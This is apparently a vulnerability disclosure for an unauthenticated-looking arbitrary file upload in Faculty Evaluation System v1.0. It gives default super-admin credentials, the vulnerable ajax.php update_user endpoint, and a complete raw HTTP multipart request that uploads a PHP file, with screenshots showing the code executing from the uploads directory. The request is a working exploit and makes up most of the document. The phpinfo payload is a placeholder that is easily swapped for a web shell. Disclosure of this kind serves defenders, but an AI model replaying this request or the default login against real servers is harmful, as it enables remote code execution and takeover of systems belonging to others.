# Faculty Evaluation System v1.0 by oretnom23 has arbitrary code execution (RCE)

BUG_Author:  Cr4at0r

vendors: https://www.sourcecodester.com/php/14635/faculty-evaluation-system-using-phpmysqli-source-code.html

The program is built using the xmapp-php8.1 version

Login account: admin@admin.com/admin123 (Super Admin account)

Vulnerability url: ip/eval/ajax.php?action=update_user

Loophole location: Faculty Evaluation System's "/eval/ajax.php?action=update_user" file exists arbitrary file upload (RCE)

Request package for file upload：


```sql
POST /eval/ajax.php?action=update_user HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/eval/index.php?page=report
Content-Length: 737
Content-Type: multipart/form-data; boundary=---------------------------166782539326470
Cookie: PHPSESSID=qm3tmf7esa9t4jsgeln6vna57r
Connection: close

-----------------------------166782539326470
Content-Disposition: form-data; name="id"

1
-----------------------------166782539326470
Content-Disposition: form-data; name="firstname"

Administrator
-----------------------------166782539326470
Content-Disposition: form-data; name="lastname"

a
-----------------------------166782539326470
Content-Disposition: form-data; name="email"

admin@admin.com
-----------------------------166782539326470
Content-Disposition: form-data; name="password"


-----------------------------166782539326470
Content-Disposition: form-data; name="img"; filename="php.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------166782539326470--
```


The files will be uploaded to this directory \eval\assets\uploads\

![image](https://user-images.githubusercontent.com/54017627/235872610-ee5e3850-21ca-43a5-a84a-31803d4640dd.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/235872485-c3515ac1-8564-43af-a501-b0618974b632.png)
